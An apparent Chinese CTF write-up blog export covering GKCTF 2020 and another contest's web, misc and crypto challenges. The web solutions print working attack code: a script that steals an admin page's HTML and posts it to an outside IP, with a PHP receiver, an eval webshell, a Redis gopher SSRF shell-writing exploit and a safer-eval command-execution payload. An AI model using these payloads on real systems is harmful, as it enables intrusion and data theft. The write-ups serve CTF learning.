ActiveXObject(MSXML[n]);</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            &#125; catch(e) &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">createXmlHttp();</span><br><span class="line">xmlHttp.onreadystatechange = function()&#123;</span><br><span class="line">  <span class="keyword">if</span> (xmlHttp.readyState == <span class="number">4</span>) &#123;</span><br><span class="line">        code=escape(xmlHttp.responseText);</span><br><span class="line">        createXmlHttp();</span><br><span class="line">        url = <span class="string">&quot;http://39.105.158.221:1215/re.php&quot;</span>;   //这里是我们服务器接受的地址</span><br><span class="line">        cc = <span class="string">&quot;htmlcode=&quot;</span> + code +<span class="string">&quot;&amp;filename=index.html&quot;</span>;</span><br><span class="line">        xmlHttp.open(<span class="string">&quot;POST&quot;</span>, url, true);</span><br><span class="line">        xmlHttp.setRequestHeader(<span class="string">&quot;Content-type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">        xmlHttp.send(cc)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">xmlHttp.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;/admin_shark.php&quot;</span>, true);//这块填写获得的后台地址。</span><br><span class="line">xmlHttp.setRequestHeader(<span class="string">&quot;Referer&quot;</span>, <span class="string">&quot;http://127.0.0.1/&quot;</span>);</span><br><span class="line">xmlHttp.send(null);</span><br></pre></td></tr></table></figure>

<p>接收源码EXP</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        function js_unescape($str) &#123;</span><br><span class="line">                $ret = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                $len = strlen($str);</span><br><span class="line">                <span class="keyword">for</span> ($i = <span class="number">0</span>;$i &lt; $len;$i++) &#123;</span><br><span class="line">                        <span class="keyword">if</span> ($str[$i] == <span class="string">&#x27;%&#x27;</span> &amp;&amp; $str[$i + <span class="number">1</span>] == <span class="string">&#x27;u&#x27;</span>) &#123;</span><br><span class="line">                                $val = hexdec(substr($str, $i + <span class="number">2</span>, <span class="number">4</span>));</span><br><span class="line">                                <span class="keyword">if</span> ($val &lt; <span class="number">0x7f</span>) $ret.= chr($val);</span><br><span class="line">                                <span class="keyword">else</span> <span class="keyword">if</span> ($val &lt; <span class="number">0x800</span>) $ret.= chr(<span class="number">0xc0</span> | ($val &gt;&gt; <span class="number">6</span>)) . chr(<span class="number">0x80</span> | ($val &amp; <span class="number">0x3f</span>));</span><br><span class="line">                                <span class="keyword">else</span> $ret.= chr(<span class="number">0xe0</span> | ($val &gt;&gt; <span class="number">12</span>)) . chr(<span class="number">0x80</span> | (($val &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x3f</span>)) . chr(<span class="number">0x80</span> | ($val &amp; <span class="number">0x3f</span>));</span><br><span class="line">                                $i+= <span class="number">5</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> ($str[$i] == <span class="string">&#x27;%&#x27;</span>) &#123;</span><br><span class="line">                                $ret.= urldecode(substr($str, $i, <span class="number">3</span>));</span><br><span class="line">                                $i+= <span class="number">2</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> $ret.= $str[$i];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> $ret;</span><br><span class="line">        &#125;</span><br><span class="line">        $data = js_unescape($_POST[<span class="string">&#x27;htmlcode&#x27;</span>]);  //对获得源码js_unescape解码。</span><br><span class="line">        $filename = $_POST[<span class="string">&#x27;filename&#x27;</span>] . date(<span class="string">&quot;y-m-d-h-i-s&quot;</span>) . <span class="string">&quot;.html&quot;</span>;</span><br><span class="line">        $myfile = fopen($filename, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">        fwrite($myfile, $data);</span><br><span class="line">        fclose($myfile);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>然后在content处访问CSRF表单即可</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200616230446072.png" alt="image-20200616230446072" style="high:80%;width:80%;" />

<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="py吗？"><a href="#py吗？" class="headerlink" title="py吗？"></a><strong>py吗？</strong></h2><p>题目是一张老外穿着python文化衫的图片。</p>
<p>修改正常高度恢复正常的crc32校验。</p>
<p>然后Stegsolve-&gt;Analyse-&gt;Data Extract</p>
<p>发现base64，解码即可得到flag。</p>
<h2 id="夏日计划"><a href="#夏日计划" class="headerlink" title="夏日计划"></a>夏日计划</h2><p>下载下来是拖进010发现是一个RAR压缩文件，用360解压打开直接拖出来即可。发现secret.rar损坏，用WinRAR修复，打开发现四个文件。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">secret<span class="number">-1</span></span><br><span class="line">secret<span class="number">-2</span></span><br><span class="line">secret<span class="number">-3</span></span><br><span class="line">secret<span class="number">-4</span></span><br></pre></td></tr></table></figure>

<p>这里看官方wp是伪加密修改这里。</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200616091015847.png" alt="image-20200616091015847" style="high:80%;width:80%;" />

<p>然后文件4合1</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">copy /b <span class="number">1</span>+<span class="number">2</span>+<span class="number">3</span>+<span class="number">4</span> new.txt</span><br></pre></td></tr></table></figure>

<p>可以使用gnuplot转化图像，也可使用PIL</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">140</span>,<span class="number">140</span>),(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">&#x27;new.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">    point = line.split()</span><br><span class="line">    img.putpixel((int(point[<span class="number">0</span>]),int(point[<span class="number">1</span>])),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">f.close()</span><br><span class="line">img.show()</span><br></pre></td></tr></table></figure>

<p>得到汉信码扫码可得flag。</p>
<h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>在wireshark里面导出Http对象列表，发现flag.jpg，改zip后缀</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200616104946314.png" alt="image-20200616104946314" style="high:80%;width:80%;" />

<p>然后crc32解密</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python crc32.py reverse <span class="number">0xC</span>RC32</span><br></pre></td></tr></table></figure>

<p>连起来即可得到flag。</p>
<h2 id="easy-analysis"><a href="#easy-analysis" class="headerlink" title="easy_analysis"></a>easy_analysis</h2><p>使用的是windows版</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">volatility.exe -f memory imageinfo <span class="comment">#判断系统，猜测为 win7SP1X64</span></span><br><span class="line">volatility.exe -f memory --profile=Win7SP1x64 pslist <span class="comment">#查看进程 </span></span><br><span class="line">volatility.exe -f memory --profile=Win7SP1x64 cmdscan <span class="comment">#查看命令行记录，发现flag 文件夹。 </span></span><br><span class="line">volatility.exe -f memory --profile=Win7SP1x64 filescan|findstr <span class="string">&quot;flag&quot;</span> <span class="comment">#尝试查找带 flag 的文件发现一个 analyse.zip 文件 </span></span><br><span class="line">volatility.exe -f memory --profile=Win7SP1x64 dumpfiles -Q <span class="number">0x000000001e85f430</span> --dump-dir=outdir <span class="comment">#导出文件，修改文件名 </span></span><br><span class="line">volatility.exe -f memory --profile=Win7SP1x64 hashdump <span class="comment">#查看密码，使用md5解密解出密码AaBbCc123</span></span><br></pre></td></tr></table></figure>

<p>使用密码解压usb流量包</p>
<p>usb流量分析：<a style="text-decoration:none;" class="foo" href="http://www.ga1axy.top/index.php/archives/10/" target="_blank">传送门</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tshark -r usb.pcap -T fields -e usb.capdata | sed ‘/^\s*$/d’ &gt; usbdata.txt</span><br></pre></td></tr></table></figure>

<p>base64隐写：<a style="text-decoration:none;" class="foo" href="https://www.jianshu.com/p/48fe4dd3e5ce" target="_blank">传送门</a></p>
<p>分离数据，breakautokey.py爆破，得到压缩包密码THISKEYBOARDSUCKSFORYOU，然后再base64隐写解开即可得到flag。</p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="真·签到"><a href="#真·签到" class="headerlink" title="真·签到"></a>真·签到</h2><p>从文件提取出一段字符</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">R00yVE1NWlRIRTJFRU5CWUdVM1RNUlJURzRaVEtOUllHNFpUTU9CV0lJM0RRTlJXRzQ0VE9OSlhHWTJET05aUkc1QVRPTUJUR0kyRUVNWlZHNDNUS05aWEc0MlRHTkpaR1pBVElNUldHNDNUT05KVUc0M0RPTUJXR0kyRUtOU0ZHTTRUT09CVUc0M0VFPT09Cgo=</span><br></pre></td></tr></table></figure>

<p>CyberChef网站</p>
<p>base64-base32-魔法棒即可得到flag。</p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
  </entry>
  <entry>
    <title>GKCTF 2020</title>
    <url>/2020/06/01/GKCTF%202020/</url>
    <content><![CDATA[<p>抽空复现一下<a id="more"></a></p>
<h4 id="老八小超市"><a href="#老八小超市" class="headerlink" title="老八小超市"></a><strong>老八小超市</strong></h4><p>打开之后是个shopxo的商城，用默认后台账号密码登录，成功进入后台。</p>
<p>下载免费的主题，把一句话木马放进去。</p>
<p>安装主题，即可getshell</p>
<p>参考：<a class="foo" href="http://www.nctry.com/1660.html" target="_blank">传送门</a></p>
<p>然后在假flag告知下得知真flag在/root目录下，但是因为当前是www-data用户是没有权限访问/root目录的。</p>
<p>然后在根目录下发现auto.sh</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200526220703847.png" style="high:80%;width:80%;" />

<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200526220146582.png" style="high:80%;width:80%;" />

<p>输入ps -ef发现auto.sh是root权限执行的。</p>
<p>然后在/var/mail/makeflaghint.py修改一下代码，加入两行内容读取/root/flag到/flag.hint</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200526220613995.png" style="high:80%;width:80%;" />

<p>然后在flag.hint里面成功读取flag。</p>
<h4 id="CheckIN"><a href="#CheckIN" class="headerlink" title="CheckIN"></a><strong>CheckIN</strong></h4><p>源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;title&gt;Check_In&lt;/title&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span></span></span><br><span class="line">&#123;</span><br><span class="line">        public $code = null;</span><br><span class="line">        public $decode = null;</span><br><span class="line">        function __construct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;code = @$this-&gt;x()[&#x27;Ginkgo&#x27;];</span><br><span class="line">                $this-&gt;decode = @base64_decode( $this-&gt;code );</span><br><span class="line"><span class="meta">                @Eval($this-&gt;decode);</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function x()</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">return</span> $_REQUEST;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">new ClassName(); </span><br></pre></td></tr></table></figure>

<p>phpinfo();</p>
<p>base64加密为 cGhwaW5mbygpOw== </p>
<p>回显成功，利用一句话连接 </p>
<p>eval($_POST[cmd]);</p>
<p>base64加密得ZXZhbCgkX1BPU1RbY21kXSk7</p>
<p>在根目录看到一个flag，但是没有权限查看，还有一个readflag文件。</p>
<p>但是发现蚁剑终端并不能用，回到phpinfo()发现很多方法被禁用。</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200526225116128.png" style="high:80%;width:80%;" />

<p>过滤了很多function，想到绕过disable_functions，上传一个文件使其执行任意命令，exp地址：<a class="foo" href="https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php" target="_blank">传送门</a></p>
<p>在这里稍微改一下。</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200526225159436.png" style="high:80%;width:80%;" />

<p>然后在页面就可以得到flag。</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200526225043564.png" style="high:80%;width:80%;" />

<h4 id="cve版签到"><a href="#cve版签到" class="headerlink" title="cve版签到"></a><strong>cve版签到</strong></h4><p>通过%00截断可以让<code>get_headers()</code>请求到错误的主机，于是请求到本地。</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200526231215560.png" style="high:80%;width:80%;" />

<p>再根据提示把后缀改为123</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200526231327900.png" style="high:80%;width:80%;" />

<p>即可得到flag。</p>
<h4 id="EZ三剑客-EzWeb"><a href="#EZ三剑客-EzWeb" class="headerlink" title="EZ三剑客-EzWeb"></a><strong>EZ三剑客-EzWeb</strong></h4><p>访问?secret得到本机ip</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200527114207278.png" style="high:80%;width:80%;" />

<p>写个脚本探测内网</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;173.17.51.&#123;&#125;&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://ac0d31a7-5126-4f26-a7ec-b38aceea896a.node3.buuoj.cn&#x27;</span></span><br><span class="line">temp = <span class="string">&quot;&#123;0&#125;/index.php?url=&#123;1&#125;&amp;&amp;submit=提交&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">255</span>):</span><br><span class="line">    u = temp.format(url, ip.format(i))</span><br><span class="line">    resp = requests.get(u)</span><br><span class="line">    <span class="keyword">if</span> len(resp.text) != <span class="number">421</span>:</span><br><span class="line">    	print(i)</span><br></pre></td></tr></table></figure>

<p>跑出结果4 5 6 7 10 11</p>
<p>一个一个试，11的时候给出了提示。</p>
<p>然后用burp爆破端口</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200527114920600.png" style="high:80%;width:80%;" />

<p>payloads选numbers爆破1到65535端口，线程选1。</p>
<p>爆破出结果6374。</p>
<p>因为输入url这里只限制了<code>file://</code>，没有ban掉<code>gopher://</code>，很容易想到是Redis SSRF getshell。</p>
<p>直接用exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;173.17.51.11&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php system(\&quot;cat /flag\&quot;);?&gt;\n\n&quot;</span></span><br><span class="line">filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">	 <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.format(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">	 <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.format(path),</span><br><span class="line">	 <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.format(filename),</span><br><span class="line">	 <span class="string">&quot;save&quot;</span></span><br><span class="line">	 ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">	cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span>(<span class="params">arr</span>):</span></span><br><span class="line">	CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">	redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">	cmd+=<span class="string">&quot;*&quot;</span>+str(len(redis_arr))</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">		cmd+=CRLF+<span class="string">&quot;$&quot;</span>+str(len((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd+=CRLF</span><br><span class="line">	<span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">		payload += urllib.quote(redis_format(x))</span><br><span class="line">	print(payload)</span><br></pre></td></tr></table></figure>

<p>payload为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gopher://<span class="number">173.17</span><span class="number">.51</span><span class="number">.11</span>:<span class="number">6379</span>/_%<span class="number">2</span>A1%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">248</span>%<span class="number">0</span>D%<span class="number">0</span>Aflushall%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A3%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Aset%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">241</span>%<span class="number">0</span>D%<span class="number">0</span>A1%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2432</span>%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">3</span>C%<span class="number">3</span>Fphp%<span class="number">20</span>system%<span class="number">28</span>%<span class="number">22</span>cat%<span class="number">20</span>/flag%<span class="number">22</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A4%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">246</span>%<span class="number">0</span>D%<span class="number">0</span>Aconfig%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Aset%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Adir%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2413</span>%<span class="number">0</span>D%<span class="number">0</span>A/var/www/html%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A4%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">246</span>%<span class="number">0</span>D%<span class="number">0</span>Aconfig%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Aset%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2410</span>%<span class="number">0</span>D%<span class="number">0</span>Adbfilename%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">249</span>%<span class="number">0</span>D%<span class="number">0</span>Ashell.php%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A1%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">244</span>%<span class="number">0</span>D%<span class="number">0</span>Asave%<span class="number">0</span>D%<span class="number">0</span>A</span><br></pre></td></tr></table></figure>

<p>直接打进去。</p>
<p>在根目录下生成个文件shell.php，访问即可得到flag。</p>
<h4 id="EZ三剑客-EzNode"><a href="#EZ三剑客-EzNode" class="headerlink" title="EZ三剑客-EzNode"></a><strong>EZ三剑客-EzNode</strong></h4><p>源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">const express = require(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line">const bodyParser = require(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"></span><br><span class="line">const saferEval = require(<span class="string">&#x27;safer-eval&#x27;</span>); // <span class="number">2019.7</span>/WORKER1 找到一个很棒的库</span><br><span class="line"></span><br><span class="line">const fs = require(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line">const app = express();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(bodyParser.urlencoded(&#123; extended: false &#125;));</span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line"></span><br><span class="line">// <span class="number">2020.1</span>/WORKER2 老板说为了后期方便优化</span><br><span class="line">app.use((req, res, next) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.path === <span class="string">&#x27;/eval&#x27;</span>) &#123;</span><br><span class="line">    let delay = <span class="number">60</span> * <span class="number">1000</span>;</span><br><span class="line">    console.log(delay);</span><br><span class="line">    <span class="keyword">if</span> (Number.isInteger(parseInt(req.query.delay))) &#123;</span><br><span class="line">      delay = Math.max(delay, parseInt(req.query.delay));</span><br><span class="line">    &#125;</span><br><span class="line">    const t = setTimeout(() =&gt; next(), delay);</span><br><span class="line">    // <span class="number">2020.1</span>/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事</span><br><span class="line">    setTimeout(() =&gt; &#123;</span><br><span class="line">      clearTimeout(t);</span><br><span class="line">      console.log(<span class="string">&#x27;timeout&#x27;</span>);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        res.send(<span class="string">&#x27;Timeout!&#x27;</span>);</span><br><span class="line">      &#125; catch (e) &#123;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    next();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/eval&#x27;</span>, function (req, res) &#123;</span><br><span class="line">  let response = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (req.body.e) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      response = saferEval(req.body.e);</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">      response = <span class="string">&#x27;Wrong Wrong Wrong!!!!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  res.send(String(response));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// <span class="number">2019.10</span>/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI</span><br><span class="line">app.get(<span class="string">&#x27;/source&#x27;</span>, function (req, res) &#123;</span><br><span class="line">  res.set(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/javascript;charset=utf-8&#x27;</span>);</span><br><span class="line">  res.send(fs.readFileSync(<span class="string">&#x27;./index.js&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// <span class="number">2019.12</span>/WORKER3 为了方便我自己查看版本，加上这个接口</span><br><span class="line">app.get(<span class="string">&#x27;/version&#x27;</span>, function (req, res) &#123;</span><br><span class="line">  res.set(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/json;charset=utf-8&#x27;</span>);</span><br><span class="line">  res.send(fs.readFileSync(<span class="string">&#x27;./package.json&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, function (req, res) &#123;</span><br><span class="line">  res.set(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">  res.send(fs.readFileSync(<span class="string">&#x27;./index.html&#x27;</span>))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(80, &#x27;0.0.0.0&#x27;, () =&gt; &#123;</span><br><span class="line">  console.log(<span class="string">&#x27;Start listening&#x27;</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>分析：</p>
<ul>
<li><strong>setTimeout</strong> </li>
</ul>
<p>整数溢出，Infinity或者 大于 2147483647</p>
<p>然后get传参即可。</p>
<ul>
<li><strong>safeeval</strong></li>
</ul>
<p>RCE地址：<a class="foo" href="https://github.com/commenthol/safer-eval/issues/10" target="_blank">传送门</a></p>
<p>payload(post提交)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e=setInterval.constructor(<span class="string">&#x27;return process&#x27;</span>)().mainModule.require(<span class="string">&#x27;child_process&#x27;</span>).execSync(<span class="string">&#x27;cat /flag&#x27;</span>).toString();</span><br></pre></td></tr></table></figure>

<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200601151723022.png" style="high:80%;width:80%;" />

<h4 id="Pokémon"><a href="#Pokémon" class="headerlink" title="Pokémon"></a><strong>Pokémon</strong></h4><p>下载得到一个gba文件，用<code>VisualBoyAdvance</code>打开，玩游戏即可得到flag。</p>
<h4 id="code-obfuscation"><a href="#code-obfuscation" class="headerlink" title="code obfuscation"></a><strong>code obfuscation</strong></h4><p>得到一张残缺的二维码图片</p>
<p>然后在这个网站上面修补：<a class="foo" href="https://merricx.github.io/qrazybox/" target="_blank">传送门</a></p>
<p>或者使用ps修复也行</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200601172717498.png" style="high:50%;width:50%;" />

<p>扫二维码得gkctf，再base58解密得到压缩包密码CfjxaPF。</p>
<h4 id="Harley-Quinn"><a href="#Harley-Quinn" class="headerlink" title="Harley Quinn"></a><strong>Harley Quinn</strong></h4><p>得到一段音频，最后面有拨号音，剪切之后丢到dtmf里面。</p>
<p>解得#222833344477773338866# 根据hint九键输出ctfisfun。</p>
<p>下载hint所说的软件, FreeFileCamouflage。</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200601182225212.png" style="high:80%;width:80%;" />

<p>输入密钥和图片地址得到flag。</p>
<h4 id="Sail-a-boat-down-the-river"><a href="#Sail-a-boat-down-the-river" class="headerlink" title="Sail a boat down the river"></a><strong>Sail a boat down the river</strong></h4><p>下载得一个flag.mp4有一帧是二维码，然后扫描得到一个网盘链接，但是没有提取码，根据视频里的摄像头闪光长短转换成<code>摩斯密码</code>。解码得<code>yw8g</code>。</p>
<p>得到</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span> <span class="number">8</span> <span class="number">1</span> <span class="number">7</span> <span class="number">4</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">3</span> <span class="number">0</span> <span class="number">2</span> <span class="number">0</span> <span class="number">6</span> <span class="number">8</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">4</span> <span class="number">0</span> <span class="number">6</span> <span class="number">5</span> <span class="number">0</span> <span class="number">0</span> <span class="number">8</span> <span class="number">2</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">3</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">5</span> <span class="number">6</span></span><br><span class="line"><span class="number">7</span> <span class="number">0</span> <span class="number">4</span> <span class="number">3</span> <span class="number">0</span> <span class="number">9</span> <span class="number">2</span> <span class="number">0</span> <span class="number">1</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">5</span> <span class="number">9</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4</span> <span class="number">1</span> <span class="number">0</span> <span class="number">8</span></span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">8</span> <span class="number">0</span> <span class="number">9</span> <span class="number">0</span> <span class="number">2</span></span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">9</span> <span class="number">7</span> <span class="number">4</span> <span class="number">6</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">密文:</span><br><span class="line">efb851bdc71d72b9ff668bddd30fd6bd</span><br><span class="line">密钥:</span><br><span class="line">第一列九宫格从左到右从上到下</span><br></pre></td></tr></table></figure>

<p>在这个网站可以自动求解数独：<a class="foo" href="http://www.llang.net/sudoku/calsudoku.html" target="_blank">传送门</a></p>
<p>得到密钥<code>52693795149137</code>。</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200601185426514.png" style="high:80%;width:80%;" />

<p>然后求得压缩包密码<code>GG0kc.tf</code>，解压得到<code>逆光 vocal.ovex</code>文件。使用<code>Overture 5</code>打谱软件打开，在歌词里看到flag。</p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
  </entry>
  <entry>
    <title>WMCTF 2020</title>
    <url>/2020/08/06/WMCTF2020/</url>
    <content><![CDATA[<p>不会做，好多知识盲点🙃<a id="more"></a></p>
